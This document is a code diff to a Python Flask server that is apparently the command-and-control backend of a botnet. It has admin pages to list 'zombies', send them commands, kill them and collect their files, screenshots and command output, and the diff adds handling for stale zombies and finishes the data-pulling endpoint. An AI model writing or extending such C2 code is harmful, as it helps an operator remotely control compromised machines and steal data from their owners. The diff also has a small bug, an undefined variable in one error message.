@@ -96,7 +96,7 @@ class Server:
             # ADMIN PAGES
             - A page to view status of all known zombies -> DONE
             - A page to send instructions to zombies -> DONE
-                - way to kill zombies if needed
+                - way to kill zombies if needed -> DONE
                     - remove them from DB
             - A page to view output from zombies (files, screenshots, cmd output, etc) -> Done but ugly
             - login functionality -> DONE
@@ -104,10 +104,11 @@ class Server:
             # ZOMBIE PAGES
             - landing page for checkins -> DONE
                 - if instruction is available, redirect based on request types (download, run cmd, upload, etc)
-            - A page to handles pulling data from zombie -> INPROG
+            - A page to handles pulling data from zombie -> DONE
             - A page that handles pushing data to zombies -> INPROG 
             - TO_ADD:
                 - Some form of Zombie Auth.
+
 
         """
 
@@ -189,7 +190,8 @@ class Server:
                 if auth:
                     #Get a list of all available agents:
                     zombies = self.db.get_zombies()
-                    return render_template('agents.html', z=zombies)
+                    stale = self.db.get_stale_zombies()
+                    return render_template('agents.html', z=zombies, s=stale)
                 else:
                     logger.debug(f"presented token {token} wasn't found in DB!")
                     return redirect("/login", 302)
@@ -227,7 +229,27 @@ class Server:
             else:
                 logger.error(f"{request.remote_ip} presented {request.method}, redirecting")
                 return redirect("/login", 302)
-            
+
+        @self.app.route("/admin/stale/<zombieID>", methods=['GET','POST'])
+        def interact_stale(zombieID):
+            # This is to show all files and commands for the given ID.
+            zombie_dir = (Path(self.base_path) / "files" / "stale" / zombieID)
+            logger.debug(f"setting zombie_dir to {zombie_dir}")
+            if zombie_dir.exists():
+                # get full list of all files available
+                logger.debug(f"found path {zombie_dir}")
+                files = [x for x in zombie_dir.iterdir()]
+                files = [str(x).split(f"{zombieID}/",1)[1] for x in files]
+                logger.debug(f"found files: {files}")
+                return render_template("stale_zombie.html", id=zombieID, f=files)
+            else:
+                logger.error(f"provided zombie {zombieID} doesn't exist on disk")
+                e = f"Provided zombie {zombieID} doesn't exist on disk"
+                return render_template("error.html",error=e)
+                # This could be either an error or there was nothing to dump to disk
+                # Do we always create staledir? or should we 
+                # need to build out error page
+
         """
          - Either present the text output of a command OR act as way to download files.
         """
@@ -284,15 +306,26 @@ class Server:
                         # try:
                         zombieID = filename.split("-")[0]
                         fName = filename.split("-")[1]
-                        logger.debug(f"Found zombieID: {zombieID}")
                         home_dir = Path(self.base_path)
-                        home_dir = home_dir  / "files" / "zombies" / zombieID
-                        logger.debug(f"home_dir is: {home_dir}")
-                        if home_dir.exists():
-                            upload_dir = home_dir / "post"
-                        else:
-                            logger.error("Zombie ID not found!!")
-                            return redirect("/login", 302)
+                        logger.debug(f"ID: {zombieID}, name: {fName}")
+                        try:
+                            # see if zombie is active or not
+                            if ( self.db.is_zombie(zombieID) ):
+                                home_dir = home_dir  / "files" / "zombies" / zombieID
+                                logger.debug(f"home_dir is: {home_dir}")
+                                if home_dir.exists():
+                                    upload_dir = home_dir / "post"
+                                else:
+                                    logger.error("Zombie ID not found!!")
+                                    return redirect("/login", 302)
+                            else:
+                                # stale zombie
+                                upload_dir = home_dir / "files" / "stale" / zombieID
+                        except Exception as e:
+                            error = f"Couldn't download {fname} from {zombieID} due to {e}"
+                            logger.error(error)
+                            return render_template("error.html",error=error)
+                        
                         # except Exception as e:
                         #     logger.error(f"Exception occured: {e}")
                         # uploads = path.join(self.app.config['ROOT_PATH'], self.app.config['UPLOAD_FOLDER'])
